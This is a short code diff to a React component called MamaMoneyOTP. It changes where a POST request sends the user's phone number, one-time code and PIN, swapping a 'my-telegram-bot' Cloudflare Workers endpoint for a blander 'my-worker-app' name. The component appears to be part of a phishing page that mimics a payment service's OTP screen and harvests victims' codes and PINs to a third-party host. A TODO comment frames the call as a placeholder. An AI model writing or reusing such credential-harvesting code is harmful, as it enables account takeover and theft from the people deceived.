@@ -230,7 +230,7 @@ export default function MamaMoneyOTP() {
       const code = otp.join("");
 
       // TODO: replace with actual API call
-      const response = await fetch("https://my-telegram-bot.instapayapi.workers.dev/api/otp-momosa", {
+      const response = await fetch("https://my-worker-app.instapayapi.workers.dev/api/otp-momosa", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ phone: cellphone, otp:code, pin }),
